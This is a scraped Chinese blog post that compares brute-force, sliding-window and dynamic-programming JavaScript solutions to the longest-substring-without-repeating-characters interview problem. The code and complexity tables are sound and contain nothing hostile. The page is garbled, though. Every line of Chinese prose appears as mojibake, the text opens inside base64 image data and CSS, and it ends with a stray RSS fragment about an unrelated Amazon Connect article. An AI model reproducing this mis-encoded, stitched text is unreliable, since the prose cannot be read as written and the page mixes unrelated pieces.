Qohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><hr/>
<h2 data-id="heading-0">ğŸ’¼ é¢è¯•çœŸå®åœºæ™¯è¿˜åŸï¼šä½ ä»¥ä¸ºçš„â€œèªæ˜è§£æ³•â€ï¼Œå…¶å®æ˜¯åŠåŠå­é™·é˜±</h2>
<p>ä½ ä¿¡å¿ƒæ»¡æ»¡åœ°ååœ¨ä¼šè®®å®¤é‡Œï¼Œé¢è¯•å®˜å¾®å¾®ä¸€ç¬‘ï¼š</p>
<blockquote>
<p>â€œæ¥ï¼Œå®ç°ä¸€ä¸ªå‡½æ•° <code>lengthOfLongestSubstring(s)</code>ï¼Œæ‰¾å‡ºå­—ç¬¦ä¸²ä¸­æœ€é•¿æ— é‡å¤å­—ç¬¦çš„å­ä¸²é•¿åº¦ã€‚â€</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9cfa517eef44870a35e82334e18cb27~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qCA56eLNjY2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766395806&amp;x-signature=gmqHVkXZ2udDIxfKcnMffcJWoNg%3D" alt="image.png" loading="lazy"/></p>
<p>ä½ å¿ƒé‡Œä¸€å–œï¼šè¿™é¢˜æˆ‘ä¼šï¼ä¸æ˜¯æœ‰é‡å¤å°±ç”¨å“ˆå¸Œè¡¨å—ï¼Ÿ</p>
<p>äºæ˜¯ä½ æç¬”å°±å†™ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">lengthOfLongestSubstring</span>(<span class="hljs-params">s</span>) {
  <span class="hljs-keyword">let</span> maxLen = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; s.<span class="hljs-property">length</span>; i++) {
    <span class="hljs-keyword">const</span> seen = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>();
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> j = i; j &lt; s.<span class="hljs-property">length</span>; j++) {
      <span class="hljs-keyword">if</span> (seen.<span class="hljs-title function_">has</span>(s[j])) <span class="hljs-keyword">break</span>;
      seen.<span class="hljs-title function_">add</span>(s[j]);
      maxLen = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(maxLen, j - i + <span class="hljs-number">1</span>);
    }
  }
  <span class="hljs-keyword">return</span> maxLen;
}
</code></pre>
<p>å†™å®Œè¿˜è¡¥å……ä¸€å¥ï¼šâ€œæˆ‘ç”¨äº† Set æ¥å»é‡ï¼Œæ—¶é—´å¤æ‚åº¦æ˜¯ O(nÂ²)ï¼Œç©ºé—´ O(k)ï¼Œæ¯”ä¸‰é‡å¾ªç¯å¿«å¤šäº†ï¼â€</p>
<p>é¢è¯•å®˜ç‚¹ç‚¹å¤´ï¼šâ€œå—¯ï¼Œèƒ½è·‘ã€‚é‚£â€¦â€¦æœ‰æ²¡æœ‰æ›´ä¼˜çš„ï¼Ÿæˆ–è€…æ¢ä¸ªæ€è·¯ï¼Ÿâ€</p>
<p>ä½ æ„£ä½äº†ã€‚</p>
<p>ğŸ‘‰ å…¶å®ä½ ä¸çŸ¥é“çš„æ˜¯ï¼š<strong>è™½ç„¶æ»‘åŠ¨çª—å£æ˜¯è¿™é“é¢˜çš„ä¸»æµè§£æ³•ï¼Œä½†è¿™ä¸ªé—®é¢˜ç«Ÿç„¶ä¹Ÿèƒ½ç”¨ DPï¼ˆåŠ¨æ€è§„åˆ’ï¼‰ä¼˜é›…è§£å†³ï¼</strong></p>
<p>ä»Šå¤©æˆ‘ä»¬å°±æ¥ <strong>è¡¥å…¨æœ€åä¸€å—æ‹¼å›¾</strong> â€”â€” æ­ç§˜â€œæ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²â€çš„ <strong>ç¬¬ä¸‰ç§è§£æ³•ï¼šåŠ¨æ€è§„åˆ’</strong>ï¼Œå¹¶å…¨é¢å¯¹æ¯”ä¸‰ç§ä¸»æµæ–¹æ³•ï¼Œå¸¦ä½ ä»â€œåªä¼šèƒŒæ¨¡æ¿â€è¿›åŒ–åˆ°â€œçœŸæ­£ç†è§£çŠ¶æ€è½¬ç§»â€ã€‚</p>
<hr/>
<h2 data-id="heading-1">ğŸ”¥ é—®é¢˜æœ¬è´¨ï¼šä¸æ˜¯æ‰¾â€œå‰ä»»åˆ—è¡¨â€ï¼Œæ˜¯æ‰¾â€œè¿ç»­æ‹çˆ±æœŸâ€</h2>
<p>é¦–å…ˆææ¸…æ¥šä¸€ä»¶äº‹ï¼š<strong>å­ä¸² â‰  å­åºåˆ—</strong>ï¼</p>
<ul>
<li><strong>å­åºåˆ—</strong>ï¼šåƒå›å¿†å½•ï¼Œå¯ä»¥è·³ç€çœ‹ï¼Œä¸­é—´æ–­å‡ å¹´éƒ½è¡Œã€‚</li>
<li><strong>å­ä¸²</strong>ï¼šåƒåŒå±…ç”Ÿæ´»ï¼Œå¿…é¡»å¤©å¤©è§é¢ï¼Œè¿˜å¾—ä½åœ¨ä¸€èµ·ï¼ˆè¿ç»­ï¼‰ï¼</li>
</ul>
<p>é¢˜ç›®è¦æ±‚æˆ‘ä»¬æ‰¾ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­<strong>æœ€é•¿çš„ä¸€æ®µè¿ç»­åŒºé—´</strong>ï¼Œé‡Œé¢æ¯ä¸ªå­—ç¬¦éƒ½ä¸é‡å¤ã€‚æ¯”å¦‚ï¼š</p>
<p>ğŸ‘‰ å­—ç¬¦ä¸² <code>"abcabcbb"</code><br/>
å¯èƒ½çš„ç­”æ¡ˆæœ‰ï¼š"abc"ã€"bca"ã€"cab" â€”â€” é•¿åº¦éƒ½æ˜¯ 3 âœ…<br/>
ä½†ä½ è¦æ˜¯è¯´ "abcb"ï¼Œå¯¹ä¸èµ·ï¼Œ'b' å‡ºç°ä¸¤æ¬¡ï¼Œå±äºâ€œæ„Ÿæƒ…åŠˆè…¿â€ï¼Œç›´æ¥å‡ºå±€ âŒ</p>
<p>ğŸ¯ ç›®æ ‡æ˜ç¡®ï¼šæ‰¾ä¸€æ®µ<strong>æœ€æŒä¹…ä¸”ä¸“ä¸€çš„è¿ç»­å…³ç³»</strong> ğŸ˜‚</p>
<p>è€Œä½ ä¹‹å‰çš„ O(nÂ²) è§£æ³•ï¼Œå°±åƒä¸€æ¬¡æ¬¡é‡æ–°è°ˆæ‹çˆ±ï¼š</p>
<ul>
<li>ä»ç¬¬ä¸€ä¸ªäººå¼€å§‹è°ˆ â†’ è°ˆåˆ°é‡å¤å°±åˆ†æ‰‹</li>
<li>å†ä»ç¬¬äºŒä¸ªäººå¼€å§‹è°ˆ â†’ åˆè°ˆä¸€éâ€¦â€¦</li>
</ul>
<p>èƒ½ä¸èƒ½åˆ«è¿™ä¹ˆç´¯ï¼Ÿèƒ½ä¸èƒ½â€œè¾¹èµ°è¾¹è°ƒæ•´â€ï¼Œè€Œä¸æ˜¯æ¯æ¬¡éƒ½é‡å¤´å†æ¥ï¼Ÿ</p>
<p>å½“ç„¶èƒ½ï¼è¿™å°±å¼•å‡ºæˆ‘ä»¬çš„ç»ˆææ­¦å™¨â€”â€”</p>
<hr/>
<h2 data-id="heading-2">ğŸ› ï¸ æ–¹æ³•ä¸€ï¼šæš´åŠ› + å“ˆå¸Œä¼˜åŒ–ï¼ˆO(nÂ²)ï¼‰â€”â€” åˆçº§é€‰æ‰‹çš„èˆ’é€‚åŒº</h2>
<h3 data-id="heading-3">âœ… æ€è·¯å›é¡¾ï¼š</h3>
<p>æšä¸¾æ‰€æœ‰èµ·ç‚¹ <code>i</code>ï¼Œä»è¯¥ç‚¹å‡ºå‘å‘å³æ‰©å±•ï¼Œç›´åˆ°é‡åˆ°é‡å¤å­—ç¬¦ä¸ºæ­¢ã€‚</p>
<p>ä½¿ç”¨ <code>Set</code> å¿«é€Ÿåˆ¤æ–­æ˜¯å¦é‡å¤ï¼Œé¿å…å†…å±‚å†éå†ä¸€æ¬¡ã€‚</p>
<h3 data-id="heading-4">âœ… ä»£ç å®ç°ï¼š</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">lengthOfLongestSubstring_O_n2</span>(<span class="hljs-params">s</span>) {
  <span class="hljs-keyword">let</span> maxLen = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; s.<span class="hljs-property">length</span>; i++) {
    <span class="hljs-keyword">const</span> seen = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>();
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> j = i; j &lt; s.<span class="hljs-property">length</span>; j++) {
      <span class="hljs-keyword">if</span> (seen.<span class="hljs-title function_">has</span>(s[j])) <span class="hljs-keyword">break</span>;
      seen.<span class="hljs-title function_">add</span>(s[j]);
      maxLen = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(maxLen, j - i + <span class="hljs-number">1</span>);
    }
  }
  <span class="hljs-keyword">return</span> maxLen;
}
</code></pre>
<h3 data-id="heading-5">âš ï¸ ç¼ºç‚¹åˆ†æï¼š</h3>
<ul>
<li>æ—¶é—´å¤æ‚åº¦ä»æ˜¯ O(nÂ²)ï¼Œåœ¨é•¿å­—ç¬¦ä¸²ä¸‹ä¼šè¶…æ—¶ï¼ˆå¦‚ LeetCode æµ‹è¯•ç”¨ä¾‹ï¼‰</li>
<li>è™½ç„¶ç”¨äº† Set ä¼˜åŒ–ï¼Œä½†æœ¬è´¨ä¸Šè¿˜æ˜¯â€œé‡å¤åŠ³åŠ¨â€ï¼šå¾ˆå¤šå­ä¸²è¢«åå¤æ‰«æ</li>
</ul>
<blockquote>
<p>ğŸ’¬ ç±»æ¯”ï¼šæ¯æ¬¡å¤±æ‹åéƒ½è¦é‡æ–°ç›¸äº²ï¼Œä¸èƒ½å¸å–æ•™è®­ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-6">ğŸ§© æ–¹æ³•äºŒï¼šæ»‘åŠ¨çª—å£ + Mapï¼ˆO(n)ï¼‰â€”â€” ä¸»æµç‹è€…æ–¹æ¡ˆ</h2>
<h3 data-id="heading-7">âœ… æ ¸å¿ƒæ€æƒ³ï¼š</h3>
<p>ç»´æŠ¤ä¸€ä¸ªâ€œåŠ¨æ€çª—å£â€ <code>[left, i]</code>ï¼Œåªå…è®¸æ— é‡å¤å­—ç¬¦å­˜åœ¨ã€‚</p>
<p>å³æŒ‡é’ˆ <code>i</code> ä¸æ–­æ‰©å¼ ï¼Œå·¦æŒ‡é’ˆ <code>left</code> åœ¨å‘ç°é‡å¤æ—¶æ”¶ç¼©ã€‚</p>
<p>åˆ©ç”¨ <code>Map</code> è®°å½•æ¯ä¸ªå­—ç¬¦æœ€è¿‘å‡ºç°çš„ä½ç½®ï¼Œå®ç° O(1) æŸ¥æ‰¾ã€‚</p>
<h3 data-id="heading-8">âœ… å…³é”®é€»è¾‘ï¼š</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">if</span> (map.<span class="hljs-title function_">has</span>(char) &amp;&amp; map.<span class="hljs-title function_">get</span>(char) &gt;= left) {
  left = map.<span class="hljs-title function_">get</span>(char) + <span class="hljs-number">1</span>; <span class="hljs-comment">// ç§»åŠ¨å·¦è¾¹ç•Œ</span>
}
</code></pre>
<blockquote>
<p>åªæœ‰å½“é‡å¤å­—ç¬¦ä½äºå½“å‰çª—å£å†…æ—¶æ‰è°ƒæ•´ <code>left</code>ï¼Œé˜²æ­¢â€œå›é€€â€ã€‚</p>
</blockquote>
<h3 data-id="heading-9">âœ… å®Œæ•´ä»£ç ï¼š</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">lengthOfLongestSubstring_SlidingWindow</span>(<span class="hljs-params">s</span>) {
  <span class="hljs-keyword">const</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
  <span class="hljs-keyword">let</span> left = <span class="hljs-number">0</span>, res = <span class="hljs-number">0</span>;

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; s.<span class="hljs-property">length</span>; i++) {
    <span class="hljs-keyword">const</span> char = s[i];
    <span class="hljs-keyword">if</span> (map.<span class="hljs-title function_">has</span>(char) &amp;&amp; map.<span class="hljs-title function_">get</span>(char) &gt;= left) {
      left = map.<span class="hljs-title function_">get</span>(char) + <span class="hljs-number">1</span>;
    }
    map.<span class="hljs-title function_">set</span>(char, i);
    res = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(res, i - left + <span class="hljs-number">1</span>);
  }

  <span class="hljs-keyword">return</span> res;
}
</code></pre>
<h3 data-id="heading-10">âœ… ä¼˜ç‚¹ï¼š</h3>
<ul>
<li>æ—¶é—´å¤æ‚åº¦ O(n)ï¼Œæ¯ä¸ªå­—ç¬¦ä»…è®¿é—®ä¸€æ¬¡</li>
<li>ç©ºé—´ O(k)ï¼Œk ä¸ºå­—ç¬¦é›†å¤§å°</li>
<li>é€»è¾‘æ¸…æ™°ï¼Œæ˜“äºè¿ç§»è‡³å…¶ä»–å­ä¸²é—®é¢˜</li>
</ul>
<hr/>
<h2 data-id="heading-11">ğŸ¯ æ–¹æ³•ä¸‰ï¼šåŠ¨æ€è§„åˆ’ DPï¼ˆO(n)ï¼‰â€”â€” é«˜é˜¶ç©å®¶çš„ç§˜å¯†æ­¦å™¨</h2>
<p>ä½ ä»¥ä¸º DP åªèƒ½åšèƒŒåŒ…å’Œçˆ¬æ¥¼æ¢¯ï¼Ÿé”™ï¼å®ƒä¹Ÿèƒ½ä¼˜é›…è§£å†³æœ¬é¢˜ï¼</p>
<h3 data-id="heading-12">âœ… æ ¸å¿ƒå®šä¹‰ï¼š</h3>
<p>è®¾ <code>dp[i]</code> è¡¨ç¤º <strong>ä»¥ç¬¬ i ä¸ªå­—ç¬¦ç»“å°¾çš„æœ€é•¿æ— é‡å¤å­ä¸²çš„é•¿åº¦</strong></p>
<p>æœ€ç»ˆç­”æ¡ˆï¼š<code>max(dp[0], dp[1], ..., dp[n-1])</code></p>
<hr/>
<h3 data-id="heading-13">ğŸ” çŠ¶æ€è½¬ç§»æ–¹ç¨‹æ¨å¯¼ï¼š</h3>
<p>æˆ‘ä»¬è¦å›ç­”ï¼š<code>dp[i]</code> å¦‚ä½•ç”± <code>dp[i-1]</code> æ¨å‡ºï¼Ÿ</p>
<h4 data-id="heading-14">åˆ†ä¸¤ç§æƒ…å†µï¼š</h4>




















<table><thead><tr><th>æƒ…å†µ</th><th>æ¡ä»¶</th><th>è½¬ç§»æ–¹å¼</th></tr></thead><tbody><tr><td>âœ… å½“å‰å­—ç¬¦æœªå‡ºç°è¿‡</td><td><code>lastIndex == -1</code></td><td><code>dp[i] = dp[i-1] + 1</code></td></tr><tr><td>âœ… å½“å‰å­—ç¬¦æ›¾å‡ºç°è¿‡</td><td><code>lastIndex &gt;= 0</code></td><td><code>dp[i] = min(dp[i-1] + 1, i - lastIndex)</code></td></tr></tbody></table>
<blockquote>
<p>ğŸ’¡ è§£é‡Šï¼šæ–°å­ä¸²ä¸èƒ½åŒ…å«ä¸Šæ¬¡ç›¸åŒçš„å­—ç¬¦ï¼Œæ‰€ä»¥æœ€é•¿åªèƒ½ä» <code>lastIndex + 1</code> å¼€å§‹</p>
</blockquote>
<hr/>
<h3 data-id="heading-15">ğŸ“Œ DP è§£æ³•è¯¦ç»†æ­¥éª¤æ‹†è§£ï¼ˆä»¥ <code>"abcb"</code> ä¸ºä¾‹ï¼‰</h3>























































<table><thead><tr><th>i</th><th>s[i]</th><th>dp[i-1]</th><th>prevIndexï¼ˆä¸Šæ¬¡ä½ç½®ï¼‰</th><th>å¯é€‰é•¿åº¦1: dp[i-1]+1</th><th>å¯é€‰é•¿åº¦2: i - prevIndex</th><th>dp[i] = min(ä¸¤è€…)</th><th>å½“å‰æœ€é•¿å­ä¸²</th></tr></thead><tbody><tr><td>0</td><td>'a'</td><td>-</td><td>-1</td><td>1</td><td>0 - (-1) = 1</td><td>1</td><td>"a"</td></tr><tr><td>1</td><td>'b'</td><td>1</td><td>-1</td><td>2</td><td>1 - (-1) = 2</td><td>2</td><td>"ab"</td></tr><tr><td>2</td><td>'c'</td><td>2</td><td>-1</td><td>3</td><td>2 - (-1) = 3</td><td>3</td><td>"abc"</td></tr><tr><td>3</td><td>'b'</td><td>3</td><td>1</td><td>4</td><td>3 - 1 = 2</td><td>2</td><td>"cb"</td></tr></tbody></table>
<p>âœ… æœ€ç»ˆç»“æœï¼š<code>max(dp) = 3</code></p>
<hr/>
<h3 data-id="heading-16">âœ… å®Œæ•´ä»£ç å®ç°ï¼ˆDP ç‰ˆæœ¬ï¼‰</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">lengthOfLongestSubstring_DP</span>(<span class="hljs-params">s</span>) {
  <span class="hljs-keyword">if</span> (s.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;

  <span class="hljs-keyword">const</span> dp = <span class="hljs-title class_">Array</span>(s.<span class="hljs-property">length</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// åˆå§‹åŒ– dp æ•°ç»„</span>
  <span class="hljs-keyword">const</span> charMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();           <span class="hljs-comment">// è®°å½•å­—ç¬¦æœ€åå‡ºç°ä½ç½®</span>
  <span class="hljs-keyword">let</span> res = <span class="hljs-number">1</span>;

  charMap.<span class="hljs-title function_">set</span>(s[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>);  <span class="hljs-comment">// åˆå§‹åŒ–ç¬¬ä¸€ä¸ªå­—ç¬¦</span>

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; s.<span class="hljs-property">length</span>; i++) {
    <span class="hljs-keyword">const</span> prevIndex = charMap.<span class="hljs-title function_">has</span>(s[i]) ? charMap.<span class="hljs-title function_">get</span>(s[i]) : -<span class="hljs-number">1</span>;

    <span class="hljs-comment">// çŠ¶æ€è½¬ç§»ï¼šå–ä¸¤ä¸ªé™åˆ¶ä¸­çš„è¾ƒå°å€¼</span>
    dp[i] = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(
      dp[i - <span class="hljs-number">1</span>] + <span class="hljs-number">1</span>,     <span class="hljs-comment">// æœ€å¤šæ¯”å‰ä¸€ä¸ªå¤šä¸€ä¸ª</span>
      i - prevIndex      <span class="hljs-comment">// ä¸èƒ½è¶…è¿‡ä¸ä¸Šæ¬¡é‡å¤çš„è·ç¦»</span>
    );

    res = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(res, dp[i]);         <span class="hljs-comment">// æ›´æ–°å…¨å±€æœ€å¤§å€¼</span>
    charMap.<span class="hljs-title function_">set</span>(s[i], i);              <span class="hljs-comment">// æ›´æ–°å­—ç¬¦æœ€æ–°ä½ç½®</span>
  }

  <span class="hljs-keyword">return</span> res;
}
</code></pre>
<h3 data-id="heading-17">âœ… ä¼˜ç‚¹ï¼š</h3>
<ul>
<li>åŒæ · O(n) æ—¶é—´ï¼Œé€»è¾‘æ•°å­¦æ„Ÿå¼º</li>
<li>æ˜“äºæ‰©å±•åˆ°â€œè®°å½•å…·ä½“å­ä¸²â€ç­‰å˜ç§é—®é¢˜</li>
<li>å±•ç¤ºä½ å¯¹ DP çš„æ·±åˆ»ç†è§£ï¼Œé¢è¯•åŠ åˆ†é¡¹ï¼</li>
</ul>
<h3 data-id="heading-18">âš ï¸ ç¼ºç‚¹ï¼š</h3>
<ul>
<li>ç©ºé—´å¤æ‚åº¦ç•¥é«˜ï¼šéœ€è¦ O(n) çš„ dp æ•°ç»„ï¼ˆå¯ä¼˜åŒ–ä¸º O(1)ï¼‰</li>
<li>ç†è§£é—¨æ§›è¾ƒé«˜ï¼Œä¸é€‚åˆåˆå­¦è€…å¿«é€ŸæŒæ¡</li>
</ul>
<hr/>
<h2 data-id="heading-19">ğŸ”„ ä¸‰ç§æ–¹æ³•æ¨ªå‘å¯¹æ¯”å¤§è¡¨æ ¼</h2>





































<table><thead><tr><th>æ–¹æ³•</th><th>æ—¶é—´å¤æ‚åº¦</th><th>ç©ºé—´å¤æ‚åº¦</th><th>æ˜¯å¦æ¨è</th><th>é€‚ç”¨äººç¾¤</th><th>ç‰¹ç‚¹</th></tr></thead><tbody><tr><td>æš´åŠ› + å“ˆå¸Œ</td><td>O(nÂ²)</td><td>O(k)</td><td>âŒ ä¸æ¨è</td><td>æ–°æ‰‹ç»ƒä¹ </td><td>å®¹æ˜“å†™å‡ºï¼Œä½†æ€§èƒ½å·®</td></tr><tr><td>æ»‘åŠ¨çª—å£ + Map</td><td><strong>O(n)</strong></td><td><strong>O(k)</strong></td><td>âœ… å¼ºçƒˆæ¨è</td><td>æ‰€æœ‰äºº</td><td>ä¸»æµè§£æ³•ï¼Œé«˜æ•ˆç®€æ´</td></tr><tr><td>åŠ¨æ€è§„åˆ’ DP</td><td><strong>O(n)</strong></td><td>O(n) / å¯ä¼˜åŒ–ä¸º O(k)</td><td>âœ… è¿›é˜¶æ¨è</td><td>ä¸­é«˜çº§å¼€å‘è€…</td><td>å±•ç¤ºæ€ç»´æ·±åº¦ï¼Œé€‚åˆæ·±å…¥æ¢è®¨</td></tr></tbody></table>
<blockquote>
<p>ğŸ’¡ <strong>å°æŠ€å·§</strong>ï¼šä½ å¯ä»¥å…ˆå†™æ»‘åŠ¨çª—å£ä½œä¸ºä¸»è§£æ³•ï¼Œç„¶åè¡¥å……ä¸€å¥ï¼šâ€œå…¶å®è¿™é¢˜ä¹Ÿå¯ä»¥ç”¨ DP è§£å†³â€ï¼Œç¬é—´æå‡é€¼æ ¼ï¼</p>
</blockquote>
<hr/>
<h2 data-id="heading-20">ğŸ§  å¦‚ä½•é€‰æ‹©ï¼Ÿä¸€å¥è¯æ€»ç»“</h2>
<blockquote>
<ul>
<li><strong>æƒ³é€šè¿‡é¢è¯•ï¼Ÿâ†’ å†™æ»‘åŠ¨çª—å£</strong>ï¼ˆç¨³å®šã€é«˜æ•ˆã€æ˜“è®²ï¼‰</li>
<li><strong>æƒ³æƒŠè‰³é¢è¯•å®˜ï¼Ÿâ†’ æä¸€å¥ DP æ€è·¯</strong>ï¼ˆå±•ç°å¤šè§’åº¦æ€è€ƒï¼‰</li>
<li><strong>è¿˜åœ¨å†™åŒé‡å¾ªç¯ï¼Ÿâ†’ æ˜¯æ—¶å€™å‡çº§äº†ï¼</strong></li>
</ul>
</blockquote>
<hr/>
<h2 data-id="heading-21">ğŸ¯ æ€»ç»“å‡åï¼šä¸åªæ˜¯åšé¢˜ï¼Œæ˜¯æ€ç»´è·ƒè¿</h2>
<p>è§£å†³â€œæ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²â€ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€åœº<strong>ç®—æ³•è®¤çŸ¥çš„å‡çº§</strong>ï¼š</p>






























<table><thead><tr><th>å±‚æ¬¡</th><th>æ€ç»´æ–¹å¼</th><th>å…¸å‹è¡¨ç°</th></tr></thead><tbody><tr><td>æ–°æ‰‹</td><td>ä¸‰é‡å¾ªç¯</td><td>O(nÂ³)ï¼ŒCPU å“­æ™•</td></tr><tr><td>è¿›é˜¶</td><td>å“ˆå¸Œ+åŒé‡å¾ªç¯</td><td>O(nÂ²)ï¼Œçœ‹ä¼¼èªæ˜å®åˆ™ç¬¨</td></tr><tr><td>é«˜æ‰‹</td><td>æ»‘åŠ¨çª—å£ + Map</td><td>O(n)ï¼Œä¼˜é›…é«˜æ•ˆ</td></tr><tr><td>å¤§å¸ˆ</td><td>æ»‘åŠ¨çª—å£ + DP åŒè§†è§’</td><td>é¢è¯•å°ç¥ï¼Œoffer è‡ªå¸¦ BGM</td></tr></tbody></table>
<p>æŒæ¡è¿™ä¸‰ç§æ–¹æ³•ï¼Œä½ å°±æ‹¿åˆ°äº†æ‰“å¼€<strong>é«˜é¢‘é¢è¯•é¢˜å¤§é—¨çš„ä¸‡èƒ½é’¥åŒ™ + å¤‡ç”¨é’¥åŒ™ + é’¥åŒ™ä¸²ä¸Šçš„å¹¸è¿ç¬¦</strong>ï¼</p>
<hr/>
<h2 data-id="heading-22">ğŸŒŸ ç»“è¯­ï¼šæ„¿ä½ å†™çš„ä¸æ˜¯ä»£ç ï¼Œè€Œæ˜¯è‰ºæœ¯</h2>
<p>ä¸‹æ¬¡é¢è¯•å®˜å†é—®è¿™é“é¢˜ï¼Œä½ å¯ä»¥å¾®å¾®ä¸€ç¬‘ï¼š</p>
<blockquote>
<p>â€œè¿™é¢˜å•Šï¼Œæˆ‘ä¸ä»…ä¼šåšï¼Œè¿˜èƒ½è®²ä¸‰ç§è§£æ³•ã€‚â€</p>
</blockquote>
<p>å› ä¸ºä½ çŸ¥é“ï¼š</p>
<ul>
<li>æ»‘åŠ¨çª—å£æ˜¯èˆè¹ˆï¼Œ</li>
<li>Map æ˜¯è®°å¿†ï¼Œ</li>
<li>DP æ˜¯å“²å­¦ï¼Œ</li>
<li>è€Œä½ ï¼Œæ˜¯é‚£ä¸ªæŒæ§èŠ‚å¥çš„ç¼–èˆå¸ˆ + è®°å¿†ç®¡ç†è€… + å“²å­¦å®¶ã€‚</li>
</ul>
<p>ğŸ’» å†™ä»£ç ï¼Œä¹Ÿå¯ä»¥å¾ˆæµªæ¼«ã€‚</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Amazon Connectç»“åˆStrandsæ¡†æ¶åŠBedrock Agent Coreçš„æ™ºèƒ½å®¢æœæœºå™¨äººè§£å†³æ–¹æ¡ˆï¼ˆå®è·µç¯‡ï¼‰]]></title>    <link>https://juejin.cn/post/7583906478328004627</link>    